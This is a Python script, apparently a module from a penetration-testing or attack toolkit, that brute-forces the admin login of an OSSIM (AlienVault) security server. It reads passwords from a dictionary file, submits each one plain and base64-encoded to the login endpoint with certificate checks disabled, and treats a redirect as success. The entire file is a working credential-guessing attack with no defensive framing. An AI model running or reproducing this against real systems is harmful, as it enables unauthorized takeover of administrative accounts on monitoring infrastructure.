#!/usr/bin/env python3

# OSSIM Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import base64
import globals
import logging
import requests

# %%%%%%%%%% Functions %%%%%%%%%#


def ossim_brute(ip, port):

	url = globals.https + ip + ":" + str(port) + "/ossim/session/login.php"
	__location__ = os.path.realpath(os.path.join(
		os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	successurl = globals.https + ip + "/ossim/"
	bruteforceresult = 0

	for line in file:

		ossimpassword = line.strip('\n\r')
		ossimpasswordb64 = base64.b64encode(ossimpassword.encode("utf-8"))
		base64string = str(ossimpasswordb64, "utf-8")
		params = {
			'embed': '',
			'bookmark_string': '',
			'user': 'admin',
			'passu': ossimpassword,
			'pass': base64string
		}

		try:
			response = requests.post(url, params=params, verify=False)

			if response.status_code == 302 or response.url == successurl:
				globals.messages(7)
				mess = ['admin', ossimpassword]
				globals.messages(9, mess)
				bruteforceresult = 1
				file.close()
				break

		except Exception as e:
			logging.error(e, exc_info=True)

	if not bruteforceresult:
		globals.messages(8)
		file.close()

# %%%%%%%%%% The End %%%%%%%%%%#
